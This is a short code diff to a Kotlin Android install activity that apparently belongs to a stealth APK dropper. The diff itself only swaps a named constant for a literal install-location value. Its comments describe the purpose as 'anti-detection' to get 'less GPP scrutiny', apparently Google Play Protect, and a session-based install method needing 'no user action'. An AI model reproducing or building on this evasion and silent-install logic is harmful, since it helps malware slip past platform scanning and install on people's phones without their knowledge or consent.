@@ -66,7 +66,7 @@ class InstallActivity : AppCompatActivity() {
             params.setSize(apkBytes.size.toLong())
 
             // Anti-detection: internal install location — less GPP scrutiny
-            params.setInstallLocation(PackageInstaller.SessionParams.APP_INSTALL_INTERNAL)
+            params.setInstallLocation(1) // 1 = INSTALL_LOCATION_INTERNAL_ONLY
 
             // Method 1 — Session-Based: no user action required
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
